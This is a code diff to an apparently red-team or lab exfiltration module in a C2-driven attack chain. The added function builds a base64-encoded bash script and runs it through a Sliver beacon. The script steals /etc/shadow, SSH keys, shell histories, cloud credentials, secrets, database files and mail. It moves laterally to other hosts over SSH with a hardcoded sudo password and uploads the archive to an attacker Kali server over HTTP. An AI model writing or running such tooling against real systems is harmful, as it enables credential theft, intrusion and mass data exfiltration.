@@ -3,9 +3,11 @@ import re
 import time
 import subprocess
 import threading
+import base64
 
 from chainlog import log
 from advanced_initial_access import sliver_exec
+
 
 # =============================================================================
 # advanced_exfiltration.py — Advanced DB Exfiltration
@@ -126,47 +128,226 @@ def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
     return None
 
 
-def _dump_compress_and_exfil(vinzenz_beacon: str, creds: dict,
-                              results_dir: str) -> bool:
-    """Dump the DB and compress it locally on the target.
-
-    Strategy:
-      1. Beacon task: pg_dump | gzip > /tmp/.sys_backup.gz
-      2. Leave the file on the target for the next phase (no exfiltration over C2).
+def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -> bool:
+    """Run exfiltration across all hosts on the network.
+    
+    Creates target tarballs from remote hosts streamed over SSH without local
+    writes on the target workstations, packs them into a master archive,
+    and exfiltrates back to Kali.
     """
-    # ── Step 1: Dump the database ────────────────────────────────────────────
-    dump_cmd = (
-        f"PGPASSWORD='{creds['password']}' "
-        f"pg_dump -h {DB_HOST} -p {creds['port']} "
-        f"-U {creds['user']} -d {creds['dbname']} -a -T auth_tokens "
-        f"| gzip > {DUMP_REMOTE_PATH}"
-    )
-    log(f"[*] Dumping DB '{creds['dbname']}' from {DB_HOST} "
-        f"and compressing to {DUMP_REMOTE_PATH} …")
+    exfil_local_path = os.path.join(results_dir, "master_exfil.tar.gz")
+    os.makedirs(results_dir, exist_ok=True)
+    
+    # Start the one-shot HTTP receiver server on Kali
+    recv_proc = _start_receive_server(EXFIL_HTTP_PORT, exfil_local_path)
+    
+    exfil_ok = False
+    try:
+        # Build the shell script to run on vinzenz_ws
+        exfil_script = f"""#!/bin/bash
 
-    # Execute synchronously in the beacon
-    sliver_exec(
-        vinzenz_beacon,
-        f'execute -o -- sh -c "{dump_cmd}"',
-        timeout=120
-    )
-    log(f"[+] Database dump command completed.")
+# Create staging directory
+mkdir -p /tmp/exfil/local
+mkdir -p /tmp/exfil/john
+mkdir -p /tmp/exfil/luke
+mkdir -p /tmp/exfil/apache
 
-    # Brief wait to ensure file is flushed to disk
-    time.sleep(3)
+# Database host info
+DB_IP="{creds['host']}"
 
-    # ── Step 2: Verify dump file exists ──────────────────────────────────────
-    verify_result = sliver_exec(
-        vinzenz_beacon,
-        f"execute -o -- ls -la {DUMP_REMOTE_PATH}",
-        timeout=30
-    )
-    if verify_result and DUMP_REMOTE_PATH in verify_result:
-        log(f"[+] Dump file verified on target at {DUMP_REMOTE_PATH}.")
-        return True
-    else:
-        log(f"[-] Could not verify dump file on target.")
-        return False
+# Helper function to stage files locally on Vinzenz Workstation (with sudo)
+stage_local_files() {{
+    echo "[*] Collecting local target files on Vinzenz Workstation ..."
+    # 1. Credentials, history, system configs
+    sudo cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
+    sudo cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
+    sudo cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
+    
+    # 2. Users and root directories (history, ssh, cloud configs, mail)
+    for udir in /home/* /root; do
+        [ -d "$udir" ] || continue
+        uname=$(basename "$udir")
+        mkdir -p "/tmp/exfil/local/users/$uname"
+        
+        # history
+        cp "$udir"/.bash_history "/tmp/exfil/local/users/$uname/bash_history" 2>/dev/null || true
+        cp "$udir"/.zsh_history "/tmp/exfil/local/users/$uname/zsh_history" 2>/dev/null || true
+        
+        # SSH
+        if [ -d "$udir/.ssh" ]; then
+            mkdir -p "/tmp/exfil/local/users/$uname/ssh"
+            cp -r "$udir/.ssh"/* "/tmp/exfil/local/users/$uname/ssh/" 2>/dev/null || true
+        fi
+        
+        # Cloud configs
+        for cld in .aws .azure .gcloud; do
+            if [ -d "$udir/$cld" ]; then
+                mkdir -p "/tmp/exfil/local/users/$uname/$cld"
+                cp -r "$udir/$cld"/* "/tmp/exfil/local/users/$uname/$cld/" 2>/dev/null || true
+            fi
+        done
+    done
+    
+    # SSH server keys
+    if [ -d /etc/ssh ]; then
+        mkdir -p /tmp/exfil/local/etc_ssh
+        sudo cp -r /etc/ssh/* /tmp/exfil/local/etc_ssh/ 2>/dev/null || true
+    fi
+
+    # Secrets and physical DB stores
+    if [ -d /run/secrets ]; then
+        mkdir -p /tmp/exfil/local/run_secrets
+        sudo cp -r /run/secrets/* /tmp/exfil/local/run_secrets/ 2>/dev/null || true
+    fi
+
+    for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
+        if [ -d "$db_dir" ]; then
+            dbname=$(basename "$db_dir")
+            echo "[*] Found local DB directory: $db_dir. Archiving..."
+            sudo tar -czf "/tmp/exfil/local/db_dir_$dbname.tar.gz" -C "$db_dir" . 2>/dev/null || true
+        fi
+    done
+
+    # Local mail
+    for mdir in /var/spool/mail /var/mail; do
+        if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
+            mkdir -p /tmp/exfil/local/mail
+            sudo cp -r "$mdir"/* /tmp/exfil/local/mail/ 2>/dev/null || true
+        fi
+    done
+}}
+
+# Execute local collection
+stage_local_files
+
+# Dump PostgreSQL Database
+echo "[*] Dumping database from $DB_IP ..."
+PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"
+
+# Helper for remote harvesting script (sent to other hosts)
+build_remote_harvest_script() {{
+    cat << 'EOF'
+#!/bin/bash
+mkdir -p /tmp/harvest
+sudo cp /etc/shadow /tmp/harvest/shadow 2>/dev/null || true
+sudo cp /var/log/auth.log /tmp/harvest/auth.log 2>/dev/null || true
+sudo cp /var/log/secure /tmp/harvest/secure 2>/dev/null || true
+
+for udir in /home/* /root; do
+    [ -d "$udir" ] || continue
+    uname=$(basename "$udir")
+    mkdir -p "/tmp/harvest/users/$uname"
+    cp "$udir"/.bash_history "/tmp/harvest/users/$uname/bash_history" 2>/dev/null || true
+    cp "$udir"/.zsh_history "/tmp/harvest/users/$uname/zsh_history" 2>/dev/null || true
+    if [ -d "$udir/.ssh" ]; then
+        mkdir -p "/tmp/harvest/users/$uname/ssh"
+        cp -r "$udir/.ssh"/* "/tmp/harvest/users/$uname/ssh/" 2>/dev/null || true
+    fi
+    for cld in .aws .azure .gcloud; do
+        if [ -d "$udir/$cld" ]; then
+            mkdir -p "/tmp/harvest/users/$uname/$cld"
+            cp -r "$udir/$cld"/* "/tmp/harvest/users/$uname/$cld/" 2>/dev/null || true
+        fi
+    done
+done
+
+if [ -d /etc/ssh ]; then
+    mkdir -p /tmp/harvest/etc_ssh
+    sudo cp -r /etc/ssh/* /tmp/harvest/etc_ssh/ 2>/dev/null || true
+fi
+
+# Web files & secrets
+if [ -d /var/www/html ]; then
+    mkdir -p /tmp/harvest/var_www_html
+    sudo cp -r /var/www/html/* /tmp/harvest/var_www_html/ 2>/dev/null || true
+fi
+
+if [ -d /run/secrets ]; then
+    mkdir -p /tmp/harvest/run_secrets
+    sudo cp -r /run/secrets/* /tmp/harvest/run_secrets/ 2>/dev/null || true
+fi
+
+for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
+    if [ -d "$db_dir" ]; then
+        dbname=$(basename "$db_dir")
+        sudo tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "$db_dir" . 2>/dev/null || true
+    fi
+done
+
+for mdir in /var/spool/mail /var/mail; do
+    if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
+        mkdir -p /tmp/harvest/mail
+        sudo cp -r "$mdir"/* /tmp/harvest/mail/ 2>/dev/null || true
+    fi
+done
+
+# Compress all harvested files to stdout
+tar -czf - -C /tmp/harvest . 2>/dev/null
+rm -rf /tmp/harvest
+EOF
+}}
+
+# Compress & stream John's Workstation files
+echo "[*] Harvesting files from John's workstation ..."
+build_remote_harvest_script > /tmp/harvester.sh
+ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"
+
+# Compress & stream Luke's Workstation files
+echo "[*] Harvesting files from Luke's workstation ..."
+ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null luke 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/luke/luke_harvest.tar.gz || echo "[-] Luke workstation harvest failed"
+
+# Compress & stream Apache Webserver files
+echo "[*] Harvesting files from Apache Webserver ..."
+ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null apache 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/apache/apache_harvest.tar.gz || echo "[-] Apache harvest failed"
+
+rm -f /tmp/harvester.sh
+
+# Pack everything into a master archive
+echo "[*] Creating master archive /tmp/master_exfil.tar.gz ..."
+tar -czf /tmp/master_exfil.tar.gz -C /tmp/exfil .
+
+# Exfiltrate to Kali
+echo "[*] Exfiltrating master archive to Kali http://{KALI_IP}:{EXFIL_HTTP_PORT}/ ..."
+python3 -c "import urllib.request; data=open('/tmp/master_exfil.tar.gz','rb').read(); urllib.request.urlopen('http://{KALI_IP}:{EXFIL_HTTP_PORT}/', data=data, timeout=120)"
+
+# Clean up master archive
+rm -f /tmp/master_exfil.tar.gz
+echo "[+] Script completed successfully"
+"""
+        b64_script = base64.b64encode(exfil_script.encode()).decode()
+        
+        # Execute the script on vinzenz_ws
+        log("[*] Tasking beacon to run exfiltration script on all network hosts …")
+        task_output = _beacon_exec_wait(
+            vinzenz_beacon,
+            f"execute -o -- sh -c 'echo {b64_script} | base64 -d | bash'",
+            cmd_timeout=180,
+            max_polls=36,
+            interval=5
+        )
+        
+        if task_output:
+            log(f"[+] Beacon task completed. Output:\n{task_output}")
+        else:
+            log("[-] Beacon task did not return output or timed out.")
+            
+        # Give a small buffer for the receive server to flush
+        time.sleep(3)
+        
+        # Verify file exists on Kali
+        if os.path.exists(exfil_local_path) and os.path.getsize(exfil_local_path) > 0:
+            size_mb = os.path.getsize(exfil_local_path) / (1024 * 1024)
+            log(f"[+] Master exfiltration archive successfully received on Kali: {exfil_local_path} ({size_mb:.2f} MB)")
+            exfil_ok = True
+        else:
+            log(f"[-] Exfiltration archive not found or empty on Kali at {exfil_local_path}")
+            
+    except Exception as e:
+        log(f"[-] Exception during exfiltration: {e}")
+    finally:
+        _stop_receive_server(recv_proc)
+        
+    return exfil_ok
 
 
 # ---------------------------------------------------------------------------
@@ -189,11 +370,8 @@ def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict
     # Enforce known DB host (dynamic recon will be added later)
     creds["host"] = DB_HOST
 
-    # 2. Dump + compress (leave on target) ------------------------------------
-    exfil_ok = _dump_compress_and_exfil(vinzenz_beacon, creds, results_dir)
-
-    # 3. Cleanup skipped ------------------------------------------------------
-    # We leave the file on the target as requested by the user.
+    # 2. Network exfiltration -------------------------------------------------
+    exfil_ok = _perform_network_exfil(vinzenz_beacon, creds, results_dir)
 
     if exfil_ok:
         log("[+] Phase 8: Advanced Data Exfiltration completed successfully.")
